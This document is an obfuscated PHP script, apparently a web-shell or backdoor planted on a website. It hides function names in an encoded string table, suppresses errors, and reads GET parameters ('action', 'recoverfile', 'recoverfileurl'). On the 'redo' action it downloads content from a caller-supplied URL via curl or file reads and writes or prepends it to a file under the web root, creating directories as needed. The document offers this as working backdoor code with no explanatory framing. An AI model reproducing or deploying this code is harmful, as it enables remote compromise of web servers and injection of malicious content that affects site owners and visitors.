<?php error_reporting(E_ALL^E_NOTICE);define('O00OO', 'O00O0');$GLOBALS[O00OO] = explode('|;|?|,', 'error_reporting|;|?|,define|;|?|,O0|;|?|,O|;|?|,O0|;|?|,explode|;|?|,|@|)|6|;|?|,ini_set|@|)|6display_errors|@|)|6set_time_limit|@|)|6e10adc3949ba59abbe56e057f20f883e|@|)|6passwd|@|)|6|@|)|6trim|@|)|6action|@|)|6readfile|@|)|6recoverfile|@|)|6recoverfileurl|@|)|6test|@|)|6ok|@|)|6redo|@|)|6DOCUMENT_ROOT|@|)|6strdir|@|)|6/|@|)|6tcget|@|)|6substr|@|)|6strrpos|@|)|6is_dir|@|)|6mkdir|@|)|6file_exists|@|)|6chmod|@|)|6rdFile|@|)|6file_put_contents|@|)|6fail|@|)|6str_replace|@|)|6\\|@|)|6//|@|)|6chop|@|)|6|@|)|6extension_loaded|@|)|6curl|@|)|6function_exists|@|)|6curl_init|@|)|6curl_exec|@|)|6curl_init|@|)|6curl_setopt|@|)|6curl_exec|@|)|6curl_close|@|)|6file_get_contents|@|)|6file_get_contents|@|)|6fopen|@|)|6ini_get|@|)|6ini_get|@|)|6allow_url_fopen|@|)|6fopen|@|)|6r|@|)|6feof|@|)|6fgets|@|)|6fclose|@|)|6r|@|)|6fread|@|)|6filesize'); $GLOBALS{O00OO}{0}(E_ALL^E_NOTICE);$GLOBALS{O00OO}[0x001]($GLOBALS{O00OO}{0x0002}, $GLOBALS{O00OO}[0x00003]);$GLOBALS[$GLOBALS{O00OO}{0x000004}] = $GLOBALS{O00OO}[0x05]($GLOBALS{O00OO}{0x006}, $GLOBALS{O00OO}[0x0007]);
 @$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0]($GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x001}, 0);@$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0002](0x0e10);
$O00O00 = $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x00003};
if (isset($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000004]]) && $_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000004]]!=$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x05}) $passwd = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x006]($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000004]]);
if (isset($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0007}]) && $_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0007}]!=$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x05}) $act = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x006]($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0007}]);
if(isset($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x00008]]) && $_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x00008]]!=$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x05}) $read_file = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x006]($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x00008]]);
if(isset($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x000009}]) && $_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x000009}]!=$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x05}) $recover_file = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x006]($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x000009}]);
if(isset($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0a]]) && $_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0a]]!=$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x05}) $recover_file_url = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x006]($_GET[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0a]]);

if(isset($act) && $act == $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x00b}){
    echo $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000c];
    exit;
}
if(isset($act) && $act == $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0000d} && isset($recover_file) && isset($recover_file_url)){
    $dir=$_SERVER[$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x00000e]];
    $dir = $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0f}($dir.$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0010]);
    $pfile =  $dir.$recover_file;
    $date = $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x00011}($recover_file_url);
    $path = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000012]($pfile,0,$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0000013}($pfile,$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0010]));
    $path = $dir.$path;
    if($path!=$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x05} && !$GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x014]($path)){
        $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x0015}($path, 0755, !0);
    }
    
    
    if($GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x00016]($pfile)){
        @$GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x000017}($pfile,0644);
        $sdata = $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x0000018]($pfile);
        if($date && $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x019}($pfile,$date.PHP_EOL.$sdata)){
            echo $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000c];
        }else{
            echo $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x001a];
        }
        exit;
    }else {
        if($date && $GLOBALS{$GLOBALS{O00OO}{0x000004}}{0x019}($pfile,$date)){
            echo $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x000c];
        }else{
            echo $GLOBALS{$GLOBALS{O00OO}{0x000004}}[0x001a];
        }
        exit;
    }
}
function strdir($O0O0O) {$O0OO0=&$GLOBALS{$GLOBALS{O00OO}{0x000004}};
 return $O0OO0{0x0001b}(array($O0OO0[0x00001c],$O0OO0{0x000001d},$O0OO0{0x000001d}),array($O0OO0[0x0010],$O0OO0[0x0010],$O0OO0[0x0010]),$O0OO0[0x01e]($O0O0O));

 }
function tcget($OO000,$OO00O=''){$OO0O0=&$GLOBALS{$GLOBALS{O00OO}{0x000004}};

    $OO0OO = $OO0O0{0x001f};


    $OO000 = $OO0O0[0x006]($OO000);

     if ($OO0O0[0x00020]($OO0O0{0x000021}) && $OO0O0[0x0000022]($OO0O0{0x023}) && $OO0O0[0x0000022]($OO0O0[0x0024])){
        $OOO00 = $OO0O0{0x00025}();         $OO0O0[0x000026]($OOO00, CURLOPT_URL, $OO000);		 $OO0O0[0x000026]($OOO00, CURLOPT_HEADER, !0x001);		 $OO0O0[0x000026]($OOO00, CURLOPT_RETURNTRANSFER, 0x001);
        $OO0O0[0x000026]($OOO00, CURLOPT_TIMEOUT, 0x03c);         $OO0OO = $OO0O0{0x0000027}($OOO00);         $OO0O0[0x028]($OOO00);      }
        
        if ($OO0OO == $OO0O0{0x001f}){
            if ($OO0O0[0x0000022]($OO0O0{0x0029}) && $OO000){
                $OO0OO = @$OO0O0[0x0002a]($OO000);             }
        }
        
        if (($OO0OO == $OO0O0{0x001f}) && $OO000){
            if ($OO0O0[0x0000022]($OO0O0{0x00002b}) && $OO0O0[0x0000022]($OO0O0[0x000002c]) && $OO0O0{0x02d}($OO0O0[0x002e])){
                ($OOO0O = @$OO0O0{0x0002f}($OO000, $OO0O0[0x000030]));
                if ($OOO0O){
                    
                    while (!@$OO0O0{0x0000031}($OOO0O)){
                        $OO0OO .= @$OO0O0[0x032]($OOO0O) . $OO0O0{0x001f};                     }
                        
                        @$OO0O0{0x0033}($OOO0O);                 }
            }
        }
        return $OO0OO;


}

function rdFile($OOOOO){$O00000=&$GLOBALS{$GLOBALS{O00OO}{0x000004}};

    if($O00000[0x0000022]($O00000{0x0029})){
        return $O00000[0x0002a]($OOOOO);
    }else{
        $O0000O = $O00000{0x0002f}($OOOOO, $O00000[0x00034]);
        $O000O0 = $O00000{0x000035}($O0000O, $O00000[0x0000036]($OOOOO));
        $O00000{0x0033}($O0000O);
        return $O000O0;
    }
}
